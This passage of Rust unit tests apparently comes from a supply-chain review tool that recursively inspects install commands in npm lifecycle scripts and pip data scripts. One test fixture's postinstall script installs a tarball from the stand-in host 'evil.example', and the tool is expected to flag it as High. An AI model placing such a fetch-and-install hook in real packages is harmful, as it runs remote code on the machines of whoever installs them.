            crate::install_ref::RefOrigin::Pkgbuild {
                function: "build".to_string(),
            },
            crate::install_ref::RefManager::Npm,
            "npm-pkg@1.0.0",
        );
        let pip_ref = crate::install_ref::raw_ref(
            crate::install_ref::RefOrigin::WheelDataScript {
                path: "pkg-1.0.data/scripts/setup".to_string(),
            },
            crate::install_ref::RefManager::Pip,
            "pip-pkg==1.0.0",
        );
        let (children, findings) = ctx.review_children(&[pkgbuild_ref, pip_ref], &store, &policy);
        assert!(findings.is_empty(), "{findings:?}");
        assert_eq!(children.len(), 2);
        assert_eq!(children[0].ecosystem, Ecosystem::Npm);
        assert_eq!(children[0].chain[0], "npm:npm-pkg@1.0.0");
        assert_eq!(children[1].ecosystem, Ecosystem::PyPi);
        assert_eq!(children[1].chain[0], "pypi:pip-pkg@1.0.0");
    }

    #[test]
    fn cycle_is_cut_and_rolled_up() {
        let policy = no_advisory_policy();
        let (verdict, _) = evaluate_test(
            &[
                (
                    "a@1.0.0",
                    r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install b@1.0.0"}}"#,
                ),
                (
                    "b@1.0.0",
                    r#"{"name":"b","version":"1.0.0","scripts":{"postinstall":"npm install a@1.0.0"}}"#,
                ),
            ],
            "a@1.0.0",
            &policy,
        );
        assert_eq!(verdict.recursive.len(), 1, "no runaway recursion");
        let child = &verdict.recursive[0];
        assert!(
            child
                .findings
                .iter()
                .any(|f| f.rule_id == "R26_RECURSION_CYCLE"),
            "cycle must surface in the child findings: {:?}",
            child
                .findings
                .iter()
                .map(|f| &f.rule_id)
                .collect::<Vec<_>>()
        );
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R27_SECOND_ORDER"),
            "child HIGH cycle must roll up: {:?}",
            verdict
                .findings
                .iter()
                .map(|f| (&f.rule_id, &f.severity))
                .collect::<Vec<_>>()
        );
    }

    #[test]
    fn second_visit_reuses_memo_without_refetch() {
        let policy = no_advisory_policy();
        let (verdict, fetches) = evaluate_test(
            &[
                (
                    "a@1.0.0",
                    r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install b@1.0.0","prepare":"npm install b@1.0.0"}}"#,
                ),
                ("b@1.0.0", r#"{"name":"b","version":"1.0.0"}"#),
            ],
            "a@1.0.0",
            &policy,
        );
        assert_eq!(verdict.recursive.len(), 2);
        assert_eq!(verdict.recursive[0].chain, verdict.recursive[1].chain);
        // Exactly two downloads: a's target tarball plus b's tarball on
        // its first child review. The second reference to b must hit the
        // memo, not re-download (naive re-review would fetch three times).
        assert_eq!(fetches, 2, "memo must prevent re-downloads");
    }

    #[test]
    fn child_budget_emits_r25_fail_closed() {
        let mut policy = no_advisory_policy();
        policy.recursion.max_child_reviews = 1;
        let (verdict, _) = evaluate_test(
            &[
                (
                    "a@1.0.0",
                    r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install b@1.0.0 c@1.0.0"}}"#,
                ),
                ("b@1.0.0", r#"{"name":"b","version":"1.0.0"}"#),
                ("c@1.0.0", r#"{"name":"c","version":"1.0.0"}"#),
            ],
            "a@1.0.0",
            &policy,
        );
        assert_eq!(verdict.recursive.len(), 1);
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R25_RECURSION_DEPTH")
        );
    }

    #[test]
    fn depth_zero_emits_r25_fail_closed() {
        let mut policy = no_advisory_policy();
        policy.recursion.max_depth = 0;
        let (verdict, _) = evaluate_test(
            &[
                (
                    "a@1.0.0",
                    r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install b@1.0.0"}}"#,
                ),
                ("b@1.0.0", r#"{"name":"b","version":"1.0.0"}"#),
            ],
            "a@1.0.0",
            &policy,
        );
        assert!(verdict.recursive.is_empty());
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R25_RECURSION_DEPTH")
        );
    }

    #[test]
    fn unpinned_reference_resolves_default_version_at_medium() {
        let policy = no_advisory_policy();
        let (verdict, _) = evaluate_test(
            &[
                (
                    "a@1.0.0",
                    r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install b"}}"#,
                ),
                ("b@2.5.0", r#"{"name":"b","version":"2.5.0"}"#),
            ],
            "a@1.0.0",
            &policy,
        );
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R24_LIFECYCLE_INSTALL_REF"
                    && f.severity == crate::verdict::VerdictBand::Medium),
            "unpinned ref must be Medium: {:?}",
            verdict
                .findings
                .iter()
                .map(|f| (&f.rule_id, &f.severity))
                .collect::<Vec<_>>()
        );
        assert_eq!(verdict.recursive[0].version, "2.5.0");
    }

    #[test]
    fn unresolvable_reference_is_disclosed_at_medium() {
        let policy = no_advisory_policy();
        let (verdict, _) = evaluate_test(
            &[(
                "a@1.0.0",
                r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install missing-pkg@1.0.0"}}"#,
            )],
            "a@1.0.0",
            &policy,
        );
        assert!(verdict.recursive.is_empty());
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R24_LIFECYCLE_INSTALL_REF"
                    && f.severity == crate::verdict::VerdictBand::Medium
                    && f.title == "Referenced install could not be resolved"),
            "unresolvable ref must be disclosed: {:?}",
            verdict
                .findings
                .iter()
                .map(|f| &f.title)
                .collect::<Vec<_>>()
        );
    }

    #[test]
    fn range_reference_is_disclosed_not_guessed() {
        let policy = no_advisory_policy();
        let (verdict, _) = evaluate_test(
            &[(
                "a@1.0.0",
                r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install b@^1.2.0"}}"#,
            )],
            "a@1.0.0",
            &policy,
        );
        assert!(verdict.recursive.is_empty());
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R24_LIFECYCLE_INSTALL_REF"
                    && f.title == "Referenced install could not be resolved"),
            "range ref must be disclosed: {:?}",
            verdict
                .findings
                .iter()
                .map(|f| &f.title)
                .collect::<Vec<_>>()
        );
    }

    #[test]
    fn non_registry_reference_is_high_and_not_recursed() {
        let policy = no_advisory_policy();
        let (verdict, _) = evaluate_test(
            &[(
                "a@1.0.0",
                r#"{"name":"a","version":"1.0.0","scripts":{"postinstall":"npm install https://evil.example/x.tgz"}}"#,
            )],
            "a@1.0.0",
            &policy,
        );
        assert!(verdict.recursive.is_empty());
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| f.rule_id == "R24_LIFECYCLE_INSTALL_REF"
                    && f.severity == crate::verdict::VerdictBand::High
                    && f.title == "Non-registry install reference"),
            "non-registry ref must be High: {:?}",
            verdict
                .findings
                .iter()
                .map(|f| (&f.title, &f.severity))
                .collect::<Vec<_>>()
        );
    }
}
